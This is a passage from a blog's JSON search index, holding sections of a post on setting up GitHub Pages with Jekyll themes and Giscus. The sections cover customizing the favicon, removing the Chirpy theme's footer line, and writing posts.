","date":"2025-08-19","objectID":"/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/:4:3","tags":["blog","jekyll","giscus","github"],"title":"Github Pages with Jekyll themes and Giscus","uri":"/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/#comment-feature-via-giscus"},{"categories":["Web"],"collections":null,"content":"Customize the Favicon Create a custom favicon for your website instead of using the theme’s default. Steps: Go to Favicon Generator. Click Browse to select your favicon file, then Create Favicon. Click Download the generated favicon to get the files. Extract the downloaded file and delete these two: browserconfig.xml site.webmanifest Copy the remaining files into assets/img/favicons (create the folder if it doesn’t exist). ","date":"2025-08-19","objectID":"/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/:4:4","tags":["blog","jekyll","giscus","github"],"title":"Github Pages with Jekyll themes and Giscus","uri":"/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/#customize-the-favicon"},{"categories":["Web"],"collections":null,"content":"Extends ","date":"2025-08-19","objectID":"/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/:5:0","tags":["blog","jekyll","giscus","github"],"title":"Github Pages with Jekyll themes and Giscus","uri":"/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/#extends"},{"categories":["Web"],"collections":null,"content":"Remove meta tag in Footer You can remove the line Using the Chirpy theme for Jekyll. with these steps: Create a file at _data/locales/en.yml. Copy the contents of en.yml and paste into the new file. Change the value of meta to \"\". ","date":"2025-08-19","objectID":"/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/:5:1","tags":["blog","jekyll","giscus","github"],"title":"Github Pages with Jekyll themes and Giscus","uri":"/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/#remove-meta-tag-in-footer"},{"categories":["Web"],"collections":null,"content":"Write a post Check the rules for writing blog posts with this theme and use Live Preview to preview your content. ","date":"2025-08-19","objectID":"/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/:5:2","tags":["blog","jekyll","giscus","github"],"title":"Github Pages with Jekyll themes and Giscus","uri":"/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/#write-a-post"}]